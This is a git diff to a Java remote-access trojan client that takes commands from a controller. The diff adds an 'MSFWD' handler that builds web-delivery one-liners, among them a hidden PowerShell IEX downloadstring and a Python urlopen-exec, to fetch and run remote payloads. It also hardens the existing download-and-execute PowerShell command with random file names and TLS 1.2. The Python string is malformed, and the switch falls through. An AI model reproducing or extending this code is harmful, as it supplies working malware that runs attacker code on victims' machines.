@@ -15,6 +15,7 @@ import java.net.Socket;
 import java.net.URI;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Random;
 import java.util.concurrent.TimeUnit;
 
 public class Client {
@@ -177,6 +178,10 @@ public class Client {
                     Thread.sleep(200);
                     communicate((String) sysClip.getData(DataFlavor.stringFlavor));
 
+                } else if (input.contains("MSFWD")){
+                    String url = input.split(" ")[2];
+                    String target = input.split(" ")[1];
+                    doWebDelivery(url, target);
                 } else if (input.contains("VISIT")) {
                     System.out.println("GOING TO: " + new URI(input.split(" ")[1]).toString());
                     Desktop.getDesktop().browse(new URI(input.split(" ")[1]));
@@ -202,9 +207,10 @@ public class Client {
                 } else if (input.contains("DAE")){
                     communicate("DAE");
                     String url = input.split(" ")[1];
+                    String fname = randTextAlpha(8);
                     // Attempts to download and execute a binary. If it is successful, send back `1`, else `0`.
                     if (SYSTEMOS.contains("Windows")){
-                        int status = execNoComm("PowerShell (New-Object System.Net.WebClient).DownloadFile('" + url + "', 'A7ytnAR');Start-Process 'A7ytnAR'");
+                        int status = execNoComm("PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + fname + "');Start-Process '" + fname + "'");
                         System.out.println("DaE status: " + status);
                         communicate(status);
                     } else {
@@ -448,5 +454,37 @@ public class Client {
         frame.setEnabled(true);
 
         JOptionPane.showMessageDialog(frame, msg, "ALERT", JOptionPane.INFORMATION_MESSAGE);
+    }
+
+    public void doWebDelivery(String url, String target){
+        String cmd = "";
+        System.out.println(target);
+        switch (target){
+            case "python":
+                if (SYSTEMOS.contains("Windows")){
+                    cmd = "python.exe -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(;" + url + "');exec(r.read());\"";
+                } else {
+                    cmd = "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(;" + url + "');exec(r.read());\"";
+                }
+            case "powershell":
+                cmd = "powershell.exe -nop -w hidden -c $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('" + url + "');";
+        }
+        if (debugMode){
+            System.out.println("Executing cmd: " + cmd);
+        }
+        execNoComm(cmd);
+    }
+
+    public String randTextAlpha(int length){
+        int leftLimit = 97; // letter 'a'
+        int rightLimit = 122; // letter 'z'
+        Random rand = new Random();
+        StringBuilder buffer = new StringBuilder();
+        for (int i = 0; i < length; i++){
+            int randomLimitedInt = leftLimit + (int)
+                    (rand.nextFloat() * (rightLimit - leftLimit + 1));
+            buffer.append((char) randomLimitedInt);
+        }
+        return buffer.toString();
     }
 }
